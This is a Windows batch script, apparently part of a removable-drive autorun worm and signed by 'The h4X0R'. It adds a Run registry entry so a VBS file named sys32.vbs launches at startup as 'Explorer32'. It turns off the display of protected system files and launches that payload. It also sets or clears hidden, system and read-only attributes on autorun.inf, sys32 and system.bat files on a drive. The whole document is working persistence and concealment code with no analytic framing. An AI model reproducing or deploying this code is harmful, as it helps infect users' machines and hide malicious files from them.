@echo off
if exist %windir%\win32.sys goto :1
reg add "hklm\Software\Microsoft\Windows\CurrentVersion\Run" /v Explorer32 /d %windir%\system32\sys32.vbs /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /d dword:00000000 /f
:1
if not "%Z"=="" goto go
if exist sys32.vbs start WScript.exe sys32.vbs&exit
if exist %windir%\system32\sys32.vbs start WScript.exe %windir%\system32\sys32.vbs&exit
exit
:go
if not "%Z"=="Open" goto go1
start explorer .\
exit
echo jhgjkhg
:go1
if not "%Z"=="Over" goto :go2
exit
:go2
if "%Z"=="-" attrib -s -h -r -a %A\sys32.*
echo hello
if "%Z"=="+" attrib +s +h +r +a %A\sys32.*
echo hello
if "%Z"=="-" attrib -s -h -r -a %A\autorun.inf
echo hello
if "%Z"=="+" attrib +s +h +r +a %A\autorun.inf
echo hello
if "%Z"=="-" attrib -s -h -r -a %A\system.bat
echo hello
if "%Z"=="+" attrib +s +h +r +a %A\system.bat
:coded by The h4X0R